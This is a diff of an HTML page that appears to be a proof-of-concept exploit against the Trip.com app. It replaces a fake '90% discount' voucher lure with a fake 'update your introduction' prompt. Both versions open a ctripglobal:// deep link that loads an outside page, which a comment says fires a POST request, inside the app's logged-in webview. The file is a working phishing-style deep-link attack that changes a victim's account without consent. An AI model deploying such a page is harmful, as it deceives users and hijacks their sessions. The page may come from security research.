@@ -3,37 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Travel Offer</title>
+    <title>Trip.com - Update Your Introduction</title>
     <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .container { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .btn { background: #0066ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; text-decoration: none; font-weight: bold; }
-        .btn:hover { background: #0052cc; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        body {
+            font-family: 'Roboto', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0066cc, #00bfff);
+            color: white;
+            text-align: center;
+            padding: 40px 20px;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            color: #333;
+            border-radius: 16px;
+            padding: 40px 30px;
+            max-width: 420px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 12px;
+            color: #0066cc;
+        }
+        p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 35px;
+        }
+        button {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 18px;
+            font-weight: 500;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0,102,204,0.4);
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 30px rgba(0,102,204,0.5);
+        }
+        .deeplink {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #888;
+            word-break: break-all;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>90% Discount Verified</h1>
-        <p>Click below to claim your Istanbul Hotel Voucher through the Trip.com app.</p>
+    <div class="card">
+        <h1>Update Your Personal Introduction</h1>
+        <p>Click the button below to update your profile introduction on Trip.com.</p>
         
-        <a id="openLink" href="#" class="btn">Claim Discount Now</a>
+        <button onclick="triggerDeepLink()">
+            Update Introduction Now
+        </button>
         
-        <div id="deeplink" style="display:none;"></div>
+        <div id="deeplink" class="deeplink"></div>
     </div>
 
     <script>
-        (function () {
-            // آدرس صفحه‌ای که وظیفه شلیک درخواست POST را دارد
-            var targetPage = "https://ferhadfaal.github.io/CV/trip/mpoc.html";
-            var deepLink = "ctripglobal://webview?url=" + encodeURIComponent(targetPage);
-
-            // نمایش دیپ لینک در المان مخفی (مطابق درخواست تو)
+        function triggerDeepLink() {
+            const targetPage = "https://ferhadfaal.github.io/CV/trip/mpoc.html";
+            const deepLink = "ctripglobal://webview?url=" + encodeURIComponent(targetPage);
+            
+            // نمایش deep link برای تست (اختیاری)
             document.getElementById("deeplink").textContent = deepLink;
-
-            // تنظیم لینک روی دکمه
-            var openLink = document.getElementById("openLink");
-            openLink.href = deepLink;
-        })();
+            
+            // باز کردن داخل اپ Trip.com
+            window.location.href = deepLink;
+        }
     </script>
 </body>
 </html>
